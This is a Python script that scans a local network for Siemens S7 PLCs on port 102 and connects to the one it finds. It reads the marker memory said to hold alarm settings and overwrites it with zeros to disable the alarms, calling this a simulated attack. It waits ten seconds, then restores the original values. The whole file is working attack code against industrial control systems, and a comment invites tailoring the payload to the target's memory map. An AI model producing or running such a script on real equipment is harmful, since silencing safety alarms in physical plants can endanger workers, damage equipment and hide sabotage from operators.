import snap7
import struct
import time
import socket
import subprocess
import re

# Configuration - Adapt these to your environment
PLC_IP = None  # Initialize as None. Will be discovered later.
PLC_RACK = 0
PLC_SLOT = 1
ALARM_MEMORY_AREA = snap7.client.Areas.MK  # Use MK (Merker/Marker memory)
ALARM_MEMORY_BYTE = 0  # Starting byte address in the memory area for alarm settings. Adjust as needed
ALARM_MEMORY_BIT = 0   # Starting bit in the ALARM_MEMORY_BYTE for the first alarm setting
ALARM_SETTINGS_LENGTH = 4 # Number of bytes allocated for Alarm Setting

ORIGINAL_ALARM_SETTINGS = None # To store original settings before modification
# Function to find the PLC's IP address by scanning the network
def find_plc_ip():
    """
    Scans the local network for devices responding on port 102 (Siemens S7 protocol).
    This is a basic implementation and might need adaptation depending on your network.
    """
    try:
        # Get local IP address and network prefix
        local_ip = socket.gethostbyname(socket.gethostname())
        network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.'

        # Scan a range of IP addresses (e.g., .1 to .254)
        for i in range(1, 255):
            target_ip = network_prefix + str(i)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Short timeout
            try:
                sock.connect((target_ip, 102))  # Siemens S7 uses port 102
                print(f"Found potential PLC at: {target_ip}")
                #Attempt S7 Communication to verify if it is a PLC
                try:
                   plc_check = snap7.client.Client()
                   plc_check.connect(target_ip, PLC_RACK, PLC_SLOT)
                   plc_check.disconnect()
                   print(f"Confirmed S7 PLC at: {target_ip}")
                   return target_ip

                except Exception as e:
                    print(f"No S7 PLC at {target_ip}")

            except (socket.timeout, socket.error):
                pass # Ignore timeout and connection errors

            finally:
                sock.close()
    except Exception as e:
        print(f"Error during network scan: {e}")
        return None

    return None  # PLC not found


def read_alarm_settings(client, area, byte_address, bit_offset, data_length):
    """Reads alarm settings from the PLC."""
    try:
      return client.read_area(area, 0, byte_address, data_length)
    except Exception as e:
      print(f"Error while reading alarm settings: {e}")
      return None


def modify_alarm_settings(client, area, byte_address, bit_offset, new_settings):
    """Modifies alarm settings in the PLC."""
    try:
        client.write_area(area, 0, byte_address, new_settings)
        print("Alarm settings modified successfully.")
    except Exception as e:
        print(f"Error while modifying alarm settings: {e}")
        return False

def restore_alarm_settings(client, area, byte_address, bit_offset, original_settings):
    """Restores alarm settings to their original values."""
    try:
        client.write_area(area, 0, byte_address, original_settings)
        print("Alarm settings restored successfully.")
    except Exception as e:
        print(f"Error while restoring alarm settings: {e}")
        return False



def main():

    global PLC_IP # Use the global PLC_IP variable
    global ORIGINAL_ALARM_SETTINGS
    # Step 1: Find PLC IP if not already known
    if PLC_IP is None:
        print("Attempting to discover PLC IP...")
        PLC_IP = find_plc_ip()
        if PLC_IP:
            print(f"PLC IP address found: {PLC_IP}")
        else:
            print("PLC IP address not found.  Please ensure the PLC is on the network.")
            return


    # Step 2: Connect to the PLC
    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Successfully connected to PLC at {PLC_IP}")
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return


    # Step 3: Read and Store Original Alarm Settings
    ORIGINAL_ALARM_SETTINGS = read_alarm_settings(plc, ALARM_MEMORY_AREA, ALARM_MEMORY_BYTE, ALARM_MEMORY_BIT, ALARM_SETTINGS_LENGTH)


    if ORIGINAL_ALARM_SETTINGS is None:
        print("Failed to read original alarm settings. Exiting.")
        plc.disconnect()
        return

    print(f"Original alarm settings: {ORIGINAL_ALARM_SETTINGS}")

    # Step 4: Modify Alarm Settings (Example: Disable All Alarms - set all bytes to 0)
    #  ***IMPORTANT***:  The 'new_settings' value is crucial and must be crafted
    #  according to your PLC's memory map and alarm configuration.  The example below
    # is simply setting all bytes to zero, which might disable some alarms.  You need
    # to understand which bytes/bits control which alarms in your specific PLC program.

    new_settings = bytes([0] * ALARM_SETTINGS_LENGTH) #Example: all alarms disabled (modify as needed)
    print(f"New settings to be applied: {new_settings}")

    if modify_alarm_settings(plc, ALARM_MEMORY_AREA, ALARM_MEMORY_BYTE, ALARM_MEMORY_BIT, new_settings) == False:
        print("Failed to modify alarm settings.")
        plc.disconnect()
        return


    # Step 5: (Optional)  Wait for a period to simulate the attack in progress
    print("Simulating attack in progress... waiting 10 seconds.")
    time.sleep(10)



    # Step 6: Restore Original Alarm Settings
    print("Restoring original alarm settings...")
    if restore_alarm_settings(plc, ALARM_MEMORY_AREA, ALARM_MEMORY_BYTE, ALARM_MEMORY_BIT, ORIGINAL_ALARM_SETTINGS) == False:
        print("Failed to restore original alarm settings.")
        plc.disconnect()
        return

    # Step 7: Disconnect from the PLC
    plc.disconnect()
    print("Disconnected from PLC.")


if __name__ == "__main__":
    main()